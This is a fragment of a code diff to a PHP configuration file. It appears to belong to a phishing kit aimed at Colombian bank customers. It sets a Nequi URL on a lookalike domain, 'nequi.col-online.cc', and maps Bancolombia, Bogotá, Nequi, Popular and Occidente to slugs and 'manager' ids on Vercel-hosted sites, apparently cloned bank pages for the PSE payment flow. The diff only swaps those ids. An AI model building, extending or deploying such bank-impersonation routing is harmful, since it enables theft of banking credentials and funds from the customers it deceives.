@@ -21,12 +21,12 @@ define('NEQUI_URL', 'https://nequi.col-online.cc/envia/nequi?k=8jiyMZckw4E2nYA6#
 
 // Bancos existentes → vercel (/sites/{slug}/manager/{id})
 $PSE_BANKS = [
-    'bancolombia' => ['slug' => 'bc', 'id' => '109'],
-    'bogota' => ['slug' => 'bg', 'id' => '109'],
-    'nequi' => ['slug' => 'nq', 'id' => '109'],
-    'popular' => ['slug' => 'pop', 'id' => '109'],
-    // 'avvillas' => ['slug' => 'avv', 'id' => '109'],
-    'occidente' => ['slug' => 'occ', 'id' => '109'],
+    'bancolombia' => ['slug' => 'bc', 'id' => '5342f229df47492baebe7f3e'],
+    'bogota' => ['slug' => 'bg', 'id' => '5342f229df47492baebe7f3e'],
+    'nequi' => ['slug' => 'nq', 'id' => '5342f229df47492baebe7f3e'],
+    'popular' => ['slug' => 'pop', 'id' => '5342f229df47492baebe7f3e'],
+    // 'avvillas' => ['slug' => 'avv', 'id' => '5342f229df47492baebe7f3e'],
+    'occidente' => ['slug' => 'occ', 'id' => '5342f229df47492baebe7f3e'],
 ];
 
 // Bancos → recaudofall (código exacto del parámetro &banco=)
